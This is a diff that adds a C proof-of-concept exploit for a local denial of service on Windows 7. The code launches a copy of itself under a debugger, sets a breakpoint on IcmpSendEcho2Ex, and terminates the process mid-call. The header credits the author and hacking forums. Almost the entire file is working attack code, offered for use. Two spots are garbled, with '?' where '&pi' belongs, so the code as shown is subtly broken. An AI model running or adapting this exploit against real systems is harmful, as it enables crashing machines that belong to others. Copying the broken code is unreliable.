@@ -1,0 +1,180 @@
+/*
+Microsoft Windows DoS (IcmpSendEcho2Ex interrupting)
+Author: l3D
+Sites: http://nullbyte.org.il, http://forums.hacking.org.il
+IRC: irc://irc.nix.co.il/#security
+Email: pupipup33@gmail.com
+Tested on Windows 7
+
+Microsoft Windows operating system is prone to a local DoS by interrupting the function IcmpSendEcho2Ex.
+The IP address argument should be a non-exist IP address on the net, so the function will wait longer time.
+*/
+#include <stdio.h>
+#include <windows.h>
+#include <iphlpapi.h>
+#include <winsock2.h>
+
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+
+#define PARAM 0xDEADBEEF
+
+void Terminate(HANDLE hProcess){
+     Sleep(150);
+     TerminateProcess(hProcess, -1);
+}
+
+int main(int argc, char **argv){
+    if( argc<2){
+        printf("Usage: %s <ip address>\n", argv[0]);
+        return 1;
+    }
+    
+    if( IsDebuggerPresent()){
+        HANDLE iphlpapi=LoadLibrary("iphlpapi.dll");
+        if( !iphlpapi){
+            perror("iphlpapi.dll");
+            return 1;
+        }
+        FARPROC IcmpSendEcho=GetProcAddress(iphlpapi, "IcmpSendEcho");
+        FARPROC IcmpCreateFile=GetProcAddress(iphlpapi, "IcmpCreateFile");
+        FARPROC IcmpCloseHandle=GetProcAddress(iphlpapi, "IcmpCloseHandle");
+        if( (IcmpSendEcho && IcmpCreateFile && IcmpCloseHandle)==0){
+            perror("icmp functions");
+            return 1;
+        }
+        
+        unsigned long ipaddr=INADDR_NONE, params[2];
+        HANDLE hIcmpFile;
+        char data[32], *reply;
+        int replySize=sizeof(ICMP_ECHO_REPLY)+sizeof(data);
+        
+        if( (ipaddr=inet_addr(argv[1]))==INADDR_NONE){
+            perror("Illegal IP address!");
+            return 1;
+        }
+        
+        if( (hIcmpFile=(HANDLE)IcmpCreateFile())==INVALID_HANDLE_VALUE){
+            perror("IcmpCreateFile");
+            return 1;
+        }
+        
+        reply=(char *)malloc(replySize);
+        ZeroMemory(data, sizeof(data));
+        params[0]=PARAM;
+        params[1]=(unsigned long)GetProcAddress(iphlpapi, "IcmpSendEcho2Ex");
+        
+        RaiseException(EXCEPTION_BREAKPOINT, 0, 2, params);
+        puts("Exception raised!");
+        IcmpSendEcho(hIcmpFile, ipaddr, data, sizeof(data), NULL, reply, replySize, 1000);
+        puts("This line should never be shown...");
+        IcmpCloseHandle(hIcmpFile);
+        return 0;
+    }
+    
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    HANDLE hProcess, hThread;
+    DEBUG_EVENT debugEvent;
+    EXCEPTION_RECORD *ExceptionRecord=&debugEvent.u.Exception.ExceptionRecord;
+    CONTEXT context;
+    FARPROC IcmpSendEcho2Ex=NULL;
+    char path[256], args[512], originalByte[1];
+    
+    ZeroMemory(?, sizeof(PROCESS_INFORMATION));
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    ZeroMemory(&debugEvent, sizeof(DEBUG_EVENT));
+    ZeroMemory(&context, sizeof(CONTEXT));
+    ZeroMemory(path, sizeof(path));
+    ZeroMemory(args, sizeof(args));
+    si.cb=sizeof(STARTUPINFO);
+    si.dwFlags=STARTF_USESHOWWINDOW;
+    si.wShowWindow=SW_HIDE;
+    context.ContextFlags=CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
+    
+    GetModuleFileName(NULL, path, sizeof(path)-1);
+    snprintf(args, sizeof(args)-1, "%s %s", path, argv[1]);
+    
+    if( !CreateProcess(
+        NULL,
+        args,
+        NULL,
+        NULL,
+        FALSE,
+        DEBUG_PROCESS,
+        NULL,
+        NULL,
+        &si,
+        ?
+    )){
+       perror("CreateProcess");
+       return 1;
+    }
+    
+    if( (hProcess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId))==NULL){
+       perror("OpenProcess");
+       return 1;
+    }
+    
+    HANDLE kernel32=LoadLibrary("kernel32.dll");
+    FARPROC DebugSetProcessKillOnExit=GetProcAddress(kernel32, "DebugSetProcessKillOnExit");
+    FARPROC DebugActiveProcessStop=GetProcAddress(kernel32, "DebugActiveProcessStop");
+    FARPROC OpenThread=GetProcAddress(kernel32, "OpenThread");
+    CloseHandle(kernel32);
+    DebugSetProcessKillOnExit(TRUE);
+    
+    while(WaitForDebugEvent(&debugEvent, INFINITE) && debugEvent.dwDebugEventCode!=EXIT_PROCESS_DEBUG_EVENT){
+             if( debugEvent.dwDebugEventCode==EXCEPTION_DEBUG_EVENT && ExceptionRecord->ExceptionCode==EXCEPTION_BREAKPOINT){
+                 if( ExceptionRecord->NumberParameters>1 && ExceptionRecord->ExceptionInformation[0]==PARAM){
+                     IcmpSendEcho2Ex=(FARPROC)ExceptionRecord->ExceptionInformation[1];
+                     printf("IcmpSendEcho2Ex %p\n", IcmpSendEcho2Ex);
+                     if( !BreakpointSet(hProcess, IcmpSendEcho2Ex, &originalByte)){
+                         perror("BreakpointSet");
+                         break;
+                     }
+                 }
+                 else if( ExceptionRecord->ExceptionAddress==IcmpSendEcho2Ex){
+                      printf("EIP %p\n", IcmpSendEcho2Ex);
+                      if( !BreakpointRetrieve(hProcess, IcmpSendEcho2Ex, &originalByte)){
+                          perror("BreakpointRetrieve");
+                          break;
+                      }
+                      if((hThread=(HANDLE)OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId))==NULL) puts("OpenThread");
+                      if(!GetThreadContext(hThread, &context)) puts("GetThreadContext");
+                      context.Eip -= 1;
+                      if(!SetThreadContext(hThread, &context)) puts("SetThreadContext");
+                      CreateThread(NULL, 0, (void *)Terminate, hProcess, 0, NULL);
+                 }
+             }
+             else if( debugEvent.dwDebugEventCode==EXCEPTION_DEBUG_EVENT){
+                  puts("Exception!");
+                  DebugActiveProcessStop(debugEvent.dwProcessId);
+                  break;
+             }
+             ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
+             ZeroMemory(&debugEvent, sizeof(DEBUG_EVENT));
+    }
+    
+    return 0;
+}
+
+BOOL BreakpointSet(HANDLE hProcess, void *addr, char *originalByte){
+     unsigned long oldProtect;
+     if(
+     VirtualProtectEx(hProcess, addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect) &&
+     ReadProcessMemory(hProcess, addr, originalByte, 1, NULL) &&
+     WriteProcessMemory(hProcess, addr, "\xCC", 1, NULL) &&
+     VirtualProtectEx(hProcess, addr, 1, oldProtect, &oldProtect))
+     return TRUE;
+     else return FALSE;
+}
+
+BOOL BreakpointRetrieve(HANDLE hProcess, void *addr, char *originalByte){
+     unsigned long oldProtect;
+     if(
+     VirtualProtectEx(hProcess, addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect) &&
+     WriteProcessMemory(hProcess, addr, originalByte, 1, NULL) &&
+     VirtualProtectEx(hProcess, addr, 1, oldProtect, &oldProtect))
+     return TRUE;
+     else return FALSE;
+}
